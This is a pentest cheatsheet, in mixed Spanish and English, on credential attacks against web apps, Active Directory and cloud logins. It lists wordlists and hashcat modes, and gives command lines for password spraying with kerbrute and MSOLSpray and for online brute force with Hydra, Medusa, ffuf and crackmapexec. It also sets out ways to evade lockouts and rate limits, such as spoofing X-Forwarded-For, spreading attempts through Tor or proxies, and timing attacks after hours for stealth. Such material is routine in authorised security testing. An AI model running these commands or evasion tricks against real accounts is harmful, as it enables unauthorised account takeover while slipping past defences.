---
aliases:
  - Password Spraying
  - Credential Stuffing
  - Hashcat Auth
  - Hydra
tags:
  - type/cheatsheet
  - vuln/auth-bypass
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Authentication & Authorization Bypass]]'
  - '[[hashcat]]'
  - '[[john]]'
  - '[[Hydra]]'
---
# Auth Bypass - Brute Force y Credential Stuffing

***

## Default Credential Wordlists

| **Wordlist** | **Path / Repo** | **Notas** |
|:---:|:---:|:---:|
| SecLists Default-Credentials | `seclists/Passwords/Default-Credentials/` | Curated list. |
| nmap-defaults | `nmap` script `--script=*-default-accounts` | NSE script. |
| BIG-IP / Cisco / CompTIA | Brand-specific files en SecLists | Per-vendor. |
| router defaults | `seclists/Passwords/Default-Credentials/default-router-passwords.txt` | Network gear. |
| iotpolice | https://github.com/iotpolice/iot_default_passwords | IoT focus. |
| `assetnote/wordlists` default-creds | Modern alt | Maintained. |
| nuclei templates default-logins | `templates/http/default-logins/` | Auto-scan. |
| ScanRepeat / Hydra builtin | Hydra ships con minimal wordlist | Quick start. |
| `seclists/Usernames/top-usernames-shortlist.txt` | Common usernames | Pair with passwords. |
| `seclists/Passwords/Common-Credentials/10-million-password-list-top-X.txt` | Top X passwords | Realistic. |
| Per-stack defaults | docs from Tomcat / Jenkins / Wordpress / etc | Direct OSINT. |
^auth-brute-defaults

___

## Password Spraying

| **Concept** | **Workflow** | **Notas** |
|:---:|:---:|:---:|
| Concept | One password tried against MANY users (vs brute force = many passwords on one user) | Avoid lockout. |
| Common passwords | `Spring2025!`, `Welcome1`, `Password123` | Predictable corp passwords. |
| Seasonal pattern | Quarterly / yearly password rotation = predictable | Common. |
| Stuffing vs spraying | Stuffing = leaked username:password. Spraying = single pass × many users | Different vectors. |
| Tools | `kerbrute`, `crackmapexec`, `Hydra`, `MSOLSpray`, `o365spray` | Stack-specific. |
| AD spraying | `kerbrute passwordspray -d target.local users.txt 'Spring2025!'` | Kerberos. |
| OWA / O365 spraying | `MSOLSpray --userlist users.txt --password 'Spring2025!'` | Microsoft cloud. |
| AWS console spraying | Via federated SSO | Cloud. |
| Slack / GitHub / Atlassian | SaaS spraying | SaaS APIs. |
| Username-as-email | `user@target.com` formats | Email pattern. |
| Lockout policy aware | Slow + distributed | Avoid trigger. |
| Multiple targets parallel | Bulk spray multiple apps | Wide net. |
^auth-brute-spraying

___

## Username Enum + Targeted Brute

| **Workflow** | **Step** | **Notas** |
|:---:|:---:|:---:|
| Step 1: enum users | Username enumeration techniques | See Detection sub-note. |
| Step 2: refine list | Filter to confirmed users | Reduce noise. |
| Step 3: brute targeted | Hydra con single user, large password list | High-confidence. |
| Step 4: monitor lockouts | Backup users si first lockout | Adaptive. |
| Combine con OSINT | LinkedIn / GitHub for usernames | Pre-step. |
| Combine con leaked breaches | HaveIBeenPwned, breach DBs | Match leaked. |
| Combine con dictionary | Common patterns + corp suffix | `John_2025`, `JDoe!1` |
| Per-username password mutations | hashcat rules con username base | `john + 2025` |
| Targeted timing | When lockouts unlikely (after-hours) | Stealth. |
| Distribute via VPN/proxy | Avoid IP block | Distributed. |
^auth-brute-targeted

___

## Offline Crack (Hashcat / John)

| **Hash type** | **Mode (hashcat)** | **Notas** |
|:---:|:---:|:---:|
| MD5 | `-m 0` | Cracked en seconds. |
| SHA1 | `-m 100` | Same. |
| SHA256 | `-m 1400` | Modern. |
| bcrypt | `-m 3200` | Slow algorithm. |
| Argon2 | Not natively supported | argon2-cffi tools. |
| NTLM | `-m 1000` | Windows hashes. |
| NetNTLMv2 | `-m 5600` | Capture from network. |
| Kerberos AS-REP | `-m 18200` | Kerberoast. |
| Kerberos TGS-REP | `-m 13100` | Same family. |
| MD5(Unix) | `-m 500` | Linux shadow. |
| SHA512(Unix) | `-m 1800` | Linux shadow. |
| bcrypt(Unix) | `-m 3200` | Linux shadow. |
| MS Cached | `-m 2100` | Windows DCC. |
| LM | `-m 3000` | Legacy weak. |
| MySQL5+ | `-m 300` | DB hashes. |
| PostgreSQL | `-m 12` | Old MD5. |
| Wordpress phpass | `-m 400` | WordPress. |
| Drupal | `-m 7900` | Drupal. |
| Joomla | `-m 11` | Joomla. |
| AES Keepass | `-m 13400` | KeePass DB. |
^auth-brute-hashcat

### Hashcat workflow estándar

```bash
# 1. Identify hash type
hashid hash.txt
# Or hashcat --identify

# 2. Crack con rockyou
hashcat -m <mode> hash.txt rockyou.txt

# 3. Apply rules
hashcat -m <mode> hash.txt rockyou.txt -r best64.rule

# 4. Mask attack si charset/length conocido
hashcat -m <mode> -a 3 hash.txt ?l?l?l?l?l?l?l?l

# 5. Hybrid (wordlist + mask)
hashcat -m <mode> -a 6 hash.txt rockyou.txt ?d?d?d?d

# 6. Show cracked
hashcat -m <mode> hash.txt --show
```

___

## Online (Hydra / Medusa / Crackmapexec)

| **Tool** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Hydra HTTP form | `hydra -L users.txt -P passes.txt target https-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'` | Standard. |
| Hydra HTTP basic | `hydra -L users.txt -P passes.txt -m / target https-get` | Basic auth. |
| Hydra SSH | `hydra -L users.txt -P passes.txt ssh://target` | SSH. |
| Hydra FTP | `hydra -L users.txt -P passes.txt ftp://target` | Same family. |
| Hydra SMB | `hydra -L users.txt -P passes.txt smb://target` | Windows network. |
| Medusa | `medusa -h target -U users.txt -P passes.txt -M http` | Alternative. |
| Patator | `patator http_fuzz url=...` | Modern Python. |
| ffuf rate limit | `ffuf -w pass.txt -X POST -u 'https://target/login' -d 'user=admin&pass=FUZZ' -fc 401 -mc 200` | Modern fuzzer. |
| CrackMapExec | `crackmapexec smb target -u admin -p passes.txt` | Multi-protocol. |
| Burp Intruder | Sniper attack con auth | UI-based. |
| BLE / API specific | Custom scripts | Edge stacks. |
| Combine con Tor / VPN | Distribute attempts | Anti-block. |
^auth-brute-online

___

## Bypass Rate Limiting / Lockout

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| HTTP/2 single-packet | Burst N requests in single packet | Modern. |
| Race condition rate limit | Multiple simultaneous before counter increments | TOCTOU. |
| Per-IP rate limit bypass | Distribute via VPN / proxy / Tor | Network. |
| `X-Forwarded-For` spoof | Server uses XFF for rate limit | Direct bypass. |
| `X-Real-IP` spoof | Same family | Variant. |
| `True-Client-IP` spoof | Akamai-style | Same. |
| Cookie-based rate limit | Clear cookie → fresh slot | Stateless. |
| Different User-Agent | If rate limit per-UA | Edge. |
| Different sessionID | New session per attempt | Stateless. |
| GraphQL batching | Multi-login en single request | Bypass per-request limit. |
| Different endpoint | `/api/v1/login` vs `/api/v2/login` separate limits | Versioning. |
| Different content-type | `multipart/form-data` vs `application/json` | Differential. |
| Bypass via mobile API | Mobile endpoints sometimes less restricted | Edge. |
| Bypass via OAuth flow | OAuth bypasses normal rate limit | Federation. |
| Bypass via WS auth | WebSocket auth less restrictive | Real-time. |
| Lockout reset via API | `POST /unlock` if reachable | Privesc. |
| Lockout per-username | Switch user on lockout | Spraying alternative. |
^auth-brute-bypass

***
